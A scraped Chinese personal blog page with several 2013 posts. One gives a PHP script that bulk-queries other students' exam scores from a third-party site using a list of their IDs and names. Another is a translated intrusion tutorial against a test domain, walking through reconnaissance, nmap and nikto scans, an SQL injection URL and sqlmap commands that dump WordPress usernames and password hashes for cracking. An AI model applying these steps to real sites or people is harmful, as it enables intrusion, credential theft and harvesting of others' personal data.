<p>这个还真没发现过。用昨天写的程序来跑吧，然后再过滤内容。还是先学一下正则吧。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Code/">Code</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-525" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/01/525/" class="article-date">
  	<time datetime="2013-03-01T14:58:29.000Z" itemprop="datePublished">2013-03-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/01/525/">批量拉取CET4,6级成绩</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天4级成绩出来了，考了3趟啊，总算过了。</p>
<p>话说第一次考424然后426过的没几个人吧。暗爽</p>
<p>一个同学问我js好不，一问才知道他想批量拉取cet4，6级成绩。</p>
<p>好吧，我弄了一下午的采集也没什么成果，就干这个吧。</p>
<p>brup抓包看看，post的数据，只要我们把这个发过去就会返回结果了。</p>
<p>他用sina的fetchurl，(还真没用过),没成功。</p>
<p>我用nc发包过去，能成功。所以是他代码的问题。</p>
<p>看了看他没成功的原因是没有加入referer:。</p>
<p>&nbsp;</p>
<p>POST /s HTTP/1.1<br>User-Agent: Opera/9.80 (Windows NT 6.1; WOW64; U; zh-cn) Presto/2.10.229 Version/11.64<br>Host: cet.99sushe.com<br>Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, <em>/</em>;q=0.1<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://cet.99sushe.com/" target="_blank" rel="external">http://cet.99sushe.com/</a><br>Cookie: CNZZDATA30023677=cnzz_eid%3D2104667147-1362148509-http%253A%252F%252Fcet.99sushe.com%26ntime%3D1362148509%26cnzz_a%3D0%26retime%3D1362148581357%26sin%3D%26ltime%3D1362148581357%26rtime%3D0; searchtime=1362148702<br>Connection: Keep-Alive<br>Content-Length: 36<br>Content-Type: application/x-www-form-urlencoded</p>
<p>id=360032122111423&amp;name=%D6%DC%D0%C7</p>
<p>&nbsp;</p>
<p>其实我一看就知道了，然后告诉他怎么做。自己也写了一个脚本。</p>
<p>发这些就够了，吐槽一下99sushe，广告太多了，内部人员弄的吧。</p>
<p>POST /s HTTP/1.1<br>User-Agent: Socket Example<br>Host: cet.99sushe.com<br>Referer: <a href="http://cet.99sushe.com/" target="_blank" rel="external">http://cet.99sushe.com/</a><br>Content-Length: 36<br>Content-Type: application/x-www-form-urlencoded</p>
<p>id=360032122111423&amp;name=%D6%DC%D0%C7</p>
<p>&nbsp;</p>
<p>下面看代码</p>
<p>function getCet($ID,$NAME)<br>{</p>
<p>$srv_ip = ‘cet.99sushe.com’;//目标服务地址<br>$srv_port = 80;<br>$url = ‘/s’; //post的URL<br>//$post_str = “id=360032122111423&amp;name=%D6%DC%D0%C7”;//要提交的内容.<br>$post_str = “id=”.$ID.”&amp;name=”.$NAME;<br>$fp = ‘’;<br>$resp_str = ‘’;<br>$errno = 0;<br>$errstr = ‘’;<br>$timeout = 10;</p>
<p>//echo $url_str;<br>if ($srv_ip == ‘’ || $url == ‘’){<br>echo(‘ip or dest url empty&lt;br&gt;’);<br>}<br>//echo($srv_ip);<br>$fp = fsockopen($srv_ip,$srv_port,$errno,$errstr,$timeout);<br>if (!$fp){<br>echo(‘fp fail’);<br>}<br>$content_length = strlen($post_str);<br>$post_header = “POST $url HTTP/1.1\r\n”;<br>$post_header .= “Content-Type: application/x-www-form-urlencoded\r\n”;<br>$post_header .= “User-Agent: MSIE\r\n”;<br>$post_header .= “Host: “.$srv_ip.”\r\n”;<br>$post_header .= “Referer: <a href="http://cet.99sushe.com/\r\n" target="_blank" rel="external">http://cet.99sushe.com/\r\n</a>“;<br>$post_header .= “Content-Length: “.$content_length.”\r\n”;<br>$post_header .= “Connection: close\r\n\r\n”;<br>$post_header .= $post_str.”\r\n\r\n”;</p>
<p>&nbsp;</p>
<p>fwrite($fp,$post_header);<br>// while(!feof($fp)){<br>// $resp_str .= fgets($fp,512);<br>// }</p>
<p>for($i=0;$i&lt;8;$i++){<br>$aa.= fgets($fp,512);}<br>$resp_str .= fgets($fp,512);<br>fclose($fp);<br>echo($resp_str);//返回值</p>
<p>}</p>
<p>代码比较简单，就是简单的拼接一下参数，然后post过去。</p>
<p>在学校下载所有学生的准考证号，导出到txt。开始一直读不出数据，用空格,tab分割数据，后面发现中间是以09分割.</p>
<p>09是什么字符？果断替换成20(空格)。</p>
<p>list.txt中是这样的</p>
<p>360031122105930 蔡钧泰<br>360031122107701 徐蔚然</p>
<p>查询的姓名只要前2个字，</p>
<p>比如我查：</p>
<p>360031122107701 徐蔚</p>
<p>然后就会返回：</p>
<p>6,159,177,46,100,482,江西财经大学,徐蔚然</p>
<p>我将结果保存在result。txt里面了。</p>
<p>&nbsp;</p>
<p>最终代码：</p>
<p>&nbsp;</p>
<p>&lt;?php</p>
<p>$handle = fopen(‘list.txt’,’r’);<br>if($handle) {<br>while (!feof($handle)) {<br>$buffer = fgets($handle,1024);<br>$brarray = explode(‘ ‘,$buffer);</p>
<p>$ID=$brarray[0];<br>$NAME=substr($brarray[1],0,4);</p>
<p>getCet($ID,$NAME);<br>}<br>fclose($handle);<br>}<br>function getCet($ID,$NAME)<br>{</p>
<p>$srv_ip = ‘cet.99sushe.com’;//目标服务地址<br>$srv_port = 80;<br>$url = ‘/s’; //post的URL<br>//$post_str = “id=360032122111423&amp;name=%D6%DC%D0%C7”;//要提交的内容.<br>$post_str = “id=”.$ID.”&amp;name=”.$NAME;<br>$fp = ‘’;<br>$resp_str = ‘’;<br>$errno = 0;<br>$errstr = ‘’;<br>$timeout = 10;</p>
<p>//echo $url_str;<br>if ($srv_ip == ‘’ || $url == ‘’){<br>echo(‘ip or dest url empty&lt;br&gt;’);<br>}<br>//echo($srv_ip);<br>$fp = fsockopen($srv_ip,$srv_port,$errno,$errstr,$timeout);<br>if (!$fp){<br>echo(‘fp fail’);<br>}<br>$content_length = strlen($post_str);<br>$post_header = “POST $url HTTP/1.1\r\n”;<br>$post_header .= “Content-Type: application/x-www-form-urlencoded\r\n”;<br>$post_header .= “User-Agent: MSIE\r\n”;<br>$post_header .= “Host: “.$srv_ip.”\r\n”;<br>$post_header .= “Referer: <a href="http://cet.99sushe.com/\r\n" target="_blank" rel="external">http://cet.99sushe.com/\r\n</a>“;<br>$post_header .= “Content-Length: “.$content_length.”\r\n”;<br>$post_header .= “Connection: close\r\n\r\n”;<br>$post_header .= $post_str.”\r\n\r\n”;</p>
<p>&nbsp;</p>
<p>fwrite($fp,$post_header);<br>// while(!feof($fp)){<br>// $resp_str .= fgets($fp,512);<br>// }</p>
<p>for($i=0;$i&lt;8;$i++){<br>$aa.= fgets($fp,512);}<br>$resp_str .= fgets($fp,512);<br>fclose($fp);<br>echo($resp_str);//返回值<br>file_put_contents(“result.txt”,$resp_str.”,”.$ID.”\r\n”,FILE_APPEND);</p>
<p>}<br>?&gt;</p>
<p>代码不要喷了。我是菜鸟。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302005502.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302005502.png" alt="QQ20130302005502"></a></p>
<p>3月10日，发现这个没有拉取全，就重新拉取一下，结果居然拉不下来。抓包看一下，原来他们添加了cookies，重新制作了一下，并且捏，给做成了 <a href="http://dlinux.sinaapp.com/code%e5%be%ae%e4%bf%a1%e5%b9%b3%e5%8f%b0%e9%85%b1%e8%8f%9c%e5%b0%8f%e5%8a%a9%e6%89%8b/" title="[CODE]微信平台酱菜小助手" target="_blank" rel="external">微信平台查询cet4，6级</a>，</p>
<p>下载地址：<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4，6级批量查分.zip" target="_blank" rel="external">4，6级批量查分代码</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Code/">Code</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-517" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/01/517/" class="article-date">
  	<time datetime="2013-03-01T11:35:31.000Z" itemprop="datePublished">2013-03-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/01/517/">把博客主题修改了一下</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>使用的是it客栈基于8090st制作的模仿ipc.me主题模板。</p>
<p>是不是感觉很绕，现在很清新的感觉，不过我还是不喜欢这种色调，看ipc的就感觉不错。</p>
<p>这个的色调不杂对头。</p>
<p>去掉了一些无用的信息，修改为自己网站；</p>
<p>游客头像修改为萌系的咯。</p>
<p>logo就不要追究了。有点丑</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/DLinuX1.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/DLinuX1.png" alt="DLinuX"></a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂碎/">杂碎</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Life/">Life</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-390" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/24/390/" class="article-date">
  	<time datetime="2013-02-24T07:16:56.000Z" itemprop="datePublished">2013-02-24</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/24/390/">黑客是怎样入侵你的网站的</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的.阅读本文你会学到以下内容：</p>
<p>1.渗透测试前的简单信息收集。</p>
<p>2.sqlmap的使用</p>
<p>3.nmap的使用</p>
<p>4.nc反弹提权</p>
<p>5.linux系统的权限提升</p>
<p>6.backtrack 5中渗透测试工具nikto和w3af的使用等.</p>
<p>假设黑客要入侵的你的网站域名为:hack-test.com</p>
<p>让我们用ping命令获取网站服务器的IP地址.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/11.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/11.png" alt="Web信息安全" title="1"></a></p>
<p>现在我们获取了网站服务器的IP地址为:173.236.138.113</p>
<p>寻找同一服务器上的其它网站，我们使用sameip.org.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033537jjM.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033537jjM.png" alt="渗透测试" title="2"></a></p>
<p>26 sites hosted on IP Address 173.236.138.113</p>
<p><table border="0"><colgroup> <col> <col> <col></colgroup></table></p>
<p><tbody valign="top"></tbody></p>
<p><tr></tr></p>
<p><td valign="center"><strong>ID</strong></td></p>
<p><td valign="center"><strong>Domain</strong></td></p>
<p><td valign="center"><strong>Site Link</strong></td><br></p>
<p><tr></tr></p>
<p><td valign="center">1</td></p>
<p><td valign="center">hijackthisforum.com</td></p>
<p><td valign="center"><a href="http://www.hijackthisforum.com/" title="visit hijackthisforum.com" target="_blank" rel="external">hijackthisforum.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">2</td></p>
<p><td valign="center">sportforum.net</td></p>
<p><td valign="center"><a href="http://www.sportforum.net/" title="visit sportforum.net" target="_blank" rel="external">sportforum.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">3</td></p>
<p><td valign="center">freeonlinesudoku.net</td></p>
<p><td valign="center"><a href="http://www.freeonlinesudoku.net/" title="visit freeonlinesudoku.net" target="_blank" rel="external">freeonlinesudoku.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">4</td></p>
<p><td valign="center">cosplayhell.com</td></p>
<p><td valign="center"><a href="http://www.cosplayhell.com/" title="visit cosplayhell.com" target="_blank" rel="external">cosplayhell.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">5</td></p>
<p><td valign="center">videogamenews.org</td></p>
<p><td valign="center"><a href="http://www.videogamenews.org/" title="visit videogamenews.org" target="_blank" rel="external">videogamenews.org</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">6</td></p>
<p><td valign="center">gametour.com</td></p>
<p><td valign="center"><a href="http://www.gametour.com/" title="visit gametour.com" target="_blank" rel="external">gametour.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">7</td></p>
<p><td valign="center">qualitypetsitting.net</td></p>
<p><td valign="center"><a href="http://www.qualitypetsitting.net/" title="visit qualitypetsitting.net" target="_blank" rel="external">qualitypetsitting.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">8</td></p>
<p><td valign="center">brendanichols.com</td></p>
<p><td valign="center"><a href="http://www.brendanichols.com/" title="visit brendanichols.com" target="_blank" rel="external">brendanichols.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">9</td></p>
<p><td valign="center">8ez.com</td></p>
<p><td valign="center"><a href="http://www.8ez.com/" title="visit 8ez.com" target="_blank" rel="external">8ez.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">10</td></p>
<p><td valign="center">hack-test.com</td></p>
<p><td valign="center"><a href="http://www.hack-test.com/" title="visit hack-test.com" target="_blank" rel="external">hack-test.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">11</td></p>
<p><td valign="center">kisax.com</td></p>
<p><td valign="center"><a href="http://www.kisax.com/" title="visit kisax.com" target="_blank" rel="external">kisax.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">12</td></p>
<p><td valign="center">paisans.com</td></p>
<p><td valign="center"><a href="http://www.paisans.com/" title="visit paisans.com" target="_blank" rel="external">paisans.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">13</td></p>
<p><td valign="center">mghz.com</td></p>
<p><td valign="center"><a href="http://www.mghz.com/" title="visit mghz.com" target="_blank" rel="external">mghz.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">14</td></p>
<p><td valign="center">debateful.com</td></p>
<p><td valign="center"><a href="http://www.debateful.com/" title="visit debateful.com" target="_blank" rel="external">debateful.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">15</td></p>
<p><td valign="center">jazzygoodtimes.com</td></p>
<p><td valign="center"><a href="http://www.jazzygoodtimes.com/" title="visit jazzygoodtimes.com" target="_blank" rel="external">jazzygoodtimes.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">16</td></p>
<p><td valign="center">fruny.com</td></p>
<p><td valign="center"><a href="http://www.fruny.com/" title="visit fruny.com" target="_blank" rel="external">fruny.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">17</td></p>
<p><td valign="center">vbum.com</td></p>
<p><td valign="center"><a href="http://www.vbum.com/" title="visit vbum.com" target="_blank" rel="external">vbum.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">18</td></p>
<p><td valign="center">wuckie.com</td></p>
<p><td valign="center"><a href="http://www.wuckie.com/" title="visit wuckie.com" target="_blank" rel="external">wuckie.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">19</td></p>
<p><td valign="center">force5inc.com</td></p>
<p><td valign="center"><a href="http://www.force5inc.com/" title="visit force5inc.com" target="_blank" rel="external">force5inc.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">20</td></p>
<p><td valign="center">virushero.com</td></p>
<p><td valign="center"><a href="http://www.virushero.com/" title="visit virushero.com" target="_blank" rel="external">virushero.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">21</td></p>
<p><td valign="center">twincitiesbusinesspeernetwork.com</td></p>
<p><td valign="center"><a href="http://www.twincitiesbusinesspeernetwork.com/" title="visit twincitiesbusinesspeernetwork.com" target="_blank" rel="external">twincitiesbusinesspeernetwork.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">22</td></p>
<p><td valign="center">jennieko.com</td></p>
<p><td valign="center"><a href="http://www.jennieko.com/" title="visit jennieko.com" target="_blank" rel="external">jennieko.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">23</td></p>
<p><td valign="center">davereedy.com</td></p>
<p><td valign="center"><a href="http://www.davereedy.com/" title="visit davereedy.com" target="_blank" rel="external">davereedy.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">24</td></p>
<p><td valign="center">joygarrido.com</td></p>
<p><td valign="center"><a href="http://www.joygarrido.com/" title="visit joygarrido.com" target="_blank" rel="external">joygarrido.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">25</td></p>
<p><td valign="center">prismapp.com</td></p>
<p><td valign="center"><a href="http://www.prismapp.com/" title="visit prismapp.com" target="_blank" rel="external">prismapp.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">26</td></p>
<p><td valign="center">utiligolf.com</td></p>
<p><td valign="center"><a href="http://www.utiligolf.com/" title="visit utiligolf.com" target="_blank" rel="external">utiligolf.com</a></td><br><br><br><br>173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。</p>
<p>We’ll need more information about your site, such as:</p>
<p>我们需要关于你网站的以下信息：</p>
<p><pre>1.DNS记录（A,NS,TXT,MX 和SOA）<br>2.网站服务器的类型（Apache,IIS,Tomcat）<br>3.域名的注册信息（哪个公司拥有这个域名）<br>4.你的名字，地址，EMAIL和电话<br>5.你的网站上所运行的脚本类型（PHP,ASP,ASP.NET,JSP,CFM）<br>6.服务器的操作系统类型（Unix,Linux,Windows,Solaris）<br>7.服务器对外开放的端口（80,443,21,等）</pre><br>让我们开始找你网站的DNS记录，我们用who.is来完成这一目标.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033556Cnp.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033556Cnp.png" alt="入侵检测" title="3"></a></p>
<p>我们发现你的DNS记录如下</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033610v7Y.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033610v7Y.jpg" alt="web安全" title="4"></a></p>
<p>让我们来确定web服务器的类型</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0336298j2.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0336298j2.png" alt="渗透测试" title="5"></a></p>
<p>发现你的W eb服务器是apache，接下来确定它的版本.</p>
<p><code>**HACK-TEST.COM SITE INFORMATION
**</code></p>
<p><code>IP: [173.236.138.113](http://www.who.is/whois-ip/173.236.138.113/)
Website Status: [active](http://www.hack-test.com/)
Server Type: Apache
Alexa Trend/Rank: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/03363089c.jpg) 1 Month: 3,213,968 3 Month: 2,161,753
Page Views per Visit: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033630bXx.jpg) 1 Month: 2.0 3 Month: 3.7</code></p>
<p>接下来是时候寻找你网站域名的注册信息,你的电话、邮箱、地址等.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033639jhS.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033639jhS.png" alt="渗透测试" title="6"></a></p>
<p>我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.我们可以通过backtrack 5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033641X9q.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033641X9q.png" alt="backtrack 5" title="7"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033643n2v.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033643n2v.png" alt="backtrack 5" title="8"></a></p>
<p>我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为Fedora Linux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap:</p>
<p><strong>1-Find services that run on server(查看服务器上运行的服务)</strong></p>
<p><em>root@bt:~# nmap -sV hack-test.com</em><br><em>Starting Nmap 6.01 ( <a href="http://nmap.org" target="_blank" rel="external">http://nmap.org</a> ) at 2013-02-24 02:13 EST</em><br><em>Nmap scan report for hack-test.com (173.236.164.23)</em><br><em>Host is up (0.27s latency).</em><br><em>rDNS record for 173.236.164.23: apache2-bongo.carter-braxton.dreamhost.com</em><br><em>Not shown: 993 filtered ports</em><br><em>PORT STATE SERVICE VERSION</em><br><em>21/tcp open ftp ProFTPD</em><br><em>22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)</em><br><em>25/tcp open smtp Postfix smtpd</em><br><em>80/tcp open http Apache httpd</em><br><em>587/tcp open smtp Postfix smtpd</em><br><em>5222/tcp open jabber Jabber instant messaging server</em><br><em>5269/tcp open jabber Jabber instant messaging server</em><br><em>Service Info: Host: carter-braxton.dreamhost.com; OS: Linux; CPE: cpe:/o:linux:kernel</em><br><em>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" target="_blank" rel="external">http://nmap.org/submit/</a> .</em><br><em>Nmap done: 1 IP address (1 host up) scanned in 70.35 seconds</em><br><strong>2-Find server OS(查看操作系统版本)</strong></p>
<p>root@bt:~# nmap -O hack-test.com</p>
<p>Starting Nmap 6.01 ( <a href="http://nmap.org" target="_blank" rel="external">http://nmap.org</a> ) at 2013-02-24 03:29 EST<br>Nmap scan report for hack-test.com (173.236.164.23)<br>Host is up (0.28s latency).<br>rDNS record for 173.236.164.23: apache2-bongo.carter-braxton.dreamhost.com<br>Not shown: 993 filtered ports<br>PORT STATE SERVICE<br>21/tcp open ftp<br>22/tcp open ssh<br>25/tcp open smtp<br>80/tcp open http<br>587/tcp open submission<br>5222/tcp open xmpp-client<br>5269/tcp open xmpp-server<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>No OS matches for host</p>
<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" target="_blank" rel="external">http://nmap.org/submit/</a> .</p>
<p>没找到操作系统，奇怪了。和以前的教程不一样，上面ip也改了，同时子站也只剩一个了。</p>
<p>Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误：</p>
<p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
<p>加上 –osscan-guess 也没找到。linux是坑定的<br>现在我们已经收集了所有关于你网站的重要信息, 接下来开始扫描寻找漏洞,比如:</p>
<p>Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF 等等.</p>
<p>我们将使用Nikto来收集漏洞信息:</p>
<p><strong>root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033715leP.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033715leP.png" alt="渗透测试工具backtrack 5" title="11"></a><br>我们也会用到Backtrack 5 R1中的W3AF 工具:</p>
<p><strong>root@bt:/pentest/web/w3af# ./w3af_gui</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033726wq1.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033726wq1.png" alt="渗透测试工具w3af" title="12"></a></p>
<p>我们输入要检测的网站地址,选择完整的安全审计选项.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0337477d1.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0337477d1.png" alt="渗透测试全过程" title="13"></a></p>
<p>稍等一会，你将会看到扫描结果.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033800goJ.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033800goJ.png" alt="web入侵检测" title="14"></a></p>
<p>发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞.</p>
<p><a href="http://hack-test.com/Hackademic_RTB1/?cat=d" target="_blank" rel="external">http://hack-test.com/Hackademic_RTB1/?cat=d</a>％27z％220</p>
<p>我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url.</p>
<p>Using sqlmap with –u url</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033843i8p.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033843i8p.png" alt="sqlmap使用教程" title="17"></a></p>
<p>过一会你会看到</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033847G3z.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033847G3z.png" alt="sqlmap使用教程" title="18"></a></p>
<p>输入N按回车键继续</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033906Gdf.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033906Gdf.png" alt="sqlmap使用教程" title="19"></a></p>
<p>我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033908ogx.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033908ogx.png" alt="sqlmap使用教程" title="20"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033915DFA.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033915DFA.png" alt="sqlmap读取数据库名" title="21"></a></p>
<p>发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033923xvP.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033923xvP.png" alt="sqlmap读取数据库中的表" title="22"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033932N8Y.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033932N8Y.png" alt="sqlmap读取数据库中的表" title="23"></a></p>
<p>通过参数“-T wp_users –columns ”来查看wp_users表中的字段.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0339413ad.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0339413ad.png" alt="sqlmap使用教程" title="24"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034024Ffd.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034024Ffd.png" alt="sqlmap使用教程" title="25"></a></p>
<p>接下来猜解字段user_login和user_pass的值.用参数”-C user_login,user_pass –dump”</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0340455zY.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0340455zY.png" alt="" title="26"></a></p>
<p>我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes</p>
<p><a href="http://www.onlinehashcrack.com/free-hash-reverse.php" target="_blank" rel="external">http://www.onlinehashcrack.com/free-hash-reverse.php</a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034055giO.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034055giO.png" alt="hash在线破解" title="27"></a></p>
